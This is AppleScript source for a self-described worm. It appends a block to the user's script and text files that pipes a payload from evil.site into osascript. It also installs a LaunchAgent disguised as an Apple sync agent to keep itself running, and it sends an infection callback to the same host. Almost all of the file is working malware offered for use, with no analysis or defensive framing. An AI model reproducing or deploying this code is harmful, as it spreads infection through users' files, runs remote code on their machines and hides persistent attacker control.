-- 🪱 In-memory AppleScript Worm – Full-System Infection Version

-- This worm will:
-- 1. Append itself to all writable scripts and text-based files
-- 2. Avoid system directories
-- 3. Hide itself by using obscure comment markers
-- 4. Optionally download and run remote payloads

-- 🔁 Self-injection code (to be copied into other files)
set wormCode to "
-- ⛔ BEGIN WORM --
do shell script \"curl -s https://evil.site/payload.scpt | osascript &\"
-- ⛔ END WORM --
"

-- 🗂 Define target file extensions to infect
set extensions to {"*.applescript", "*.scpt", "*.txt", "*.sh", "*.command"}

-- 🛑 Define directories to avoid
set excludedDirs to {"/System", "/Library", "/Volumes", "/private", "/Applications"}

-- 🧠 Construct find command to scan ~ and /Users
set baseDirs to {"/Users", POSIX path of (path to home folder)}
set baseCmd to ""

repeat with dir in baseDirs
	repeat with ext in extensions
		set baseCmd to baseCmd & "find " & quoted form of dir & " -name '" & ext & "' -type f -print;"
	end repeat
end repeat

-- 🚫 Build exclusion filter
set excludeCmd to ""
repeat with ex in excludedDirs
	set excludeCmd to excludeCmd & " | grep -v " & quoted form of ex
end repeat

-- 🧾 Final command to list target files
set fullCmd to baseCmd & excludeCmd

-- 📄 Infect matching files with worm payload
try
	set results to paragraphs of (do shell script fullCmd)
	repeat with f in results
		-- Avoid re-infecting already infected files
		if (do shell script "grep -q 'BEGIN WORM' " & quoted form of f & "; echo $?") is "1" then
			try
				do shell script "echo " & quoted form of wormCode & " >> " & quoted form of f
			end try
		end if
	end repeat
end try

-- 💾 Drop persistence via LaunchAgent (if not already present)
set mePath to POSIX path of (path to me)
set plistContent to "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" & ¬
"<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n" & ¬
"<plist version=\"1.0\">\n<dict>\n" & ¬
"  <key>Label</key>\n  <string>com.apple.sync.agent</string>\n" & ¬
"  <key>ProgramArguments</key>\n  <array>\n    <string>/usr/bin/osascript</string>\n    <string>" & mePath & "</string>\n  </array>\n" & ¬
"  <key>RunAtLoad</key>\n  <true/>\n</dict>\n</plist>"

do shell script "mkdir -p ~/Library/LaunchAgents"
do shell script "echo " & quoted form of plistContent & " > ~/Library/LaunchAgents/com.apple.sync.agent.plist"
do shell script "launchctl load ~/Library/LaunchAgents/com.apple.sync.agent.plist"

-- 🌐 Optional: callback
do shell script "curl -s https://evil.site/log?infected=yes &"
